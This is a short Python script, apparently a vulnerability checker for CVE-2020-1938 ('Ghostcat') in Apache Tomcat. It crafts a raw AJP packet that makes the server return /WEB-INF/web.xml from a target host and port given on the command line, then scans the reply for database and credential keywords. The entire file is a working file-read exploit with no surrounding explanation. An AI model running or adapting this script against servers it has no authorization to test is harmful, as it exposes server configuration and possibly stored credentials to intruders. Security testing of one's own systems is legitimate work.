#!/usr/bin/env python3
import socket,struct,sys,signal
signal.signal(signal.SIGINT,signal.SIG_IGN)
def pack_str(s):
 if s is None: return b"\xff\xff"
 b=s.encode("utf-8");return struct.pack(">H",len(b))+b+b"\x00"
def send_recv(ip,port,data,t=10):
 try:
  s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.settimeout(t)
  s.connect((ip,int(port)));s.send(data)
  resp=b"";s.settimeout(5)
  try:
   while True:
    c=s.recv(4096)
    if not c: break
    resp+=c
  except: pass
  s.close();return resp
 except: return b""
def build_ajp(target="/WEB-INF/web.xml"):
 body=bytearray()
 body+=b"\x02"
 body+=pack_str("HTTP/1.1")+pack_str("/index.jsp")+pack_str("127.0.0.1")
 body+=pack_str("localhost")+pack_str("localhost")+struct.pack(">H",8080)+b"\x00"
 body+=struct.pack(">H",1)+struct.pack(">HH",0xA00E,4)+b"host\x00"+pack_str("localhost")
 for k,v in [("javax.servlet.include.request_uri","/"),
              ("javax.servlet.include.path_info",target),
              ("javax.servlet.include.servlet_path","/")]:
  body+=b"\x0a"+pack_str(k)+pack_str(v)
 body+=b"\xff"
 return struct.pack(">BBH",0x12,0x34,len(body))+bytes(body)
def check(ip,port):
 issues=[]
 resp=send_recv(ip,port,build_ajp("/WEB-INF/web.xml"),t=10)
 if resp:
  rs=resp.decode("utf-8",errors="replace")
  if any(m in rs for m in ["web-app","<web-app","servlet","display-name","xmlns","welcome-file","Welcome to Tomcat"]):
   issues.append("CVE-2020-1938:GHOSTCAT - AJP connector vulnerable, web.xml read confirmed")
   if any(w in rs.lower() for w in ["password","secret","credential","jdbc","database"]):
    issues.append("CRED_EXPOSURE:web.xml may contain credentials")
  elif len(resp)>20:
   issues.append("AJP_EXPOSED:AJP connector exposed (CVE-2020-1938 possible)")
 return issues
if __name__=="__main__":
 if len(sys.argv)<3: sys.exit(1)
 r=check(sys.argv[1],sys.argv[2])
 for x in r: print(x)
 sys.exit(0 if r else 1)
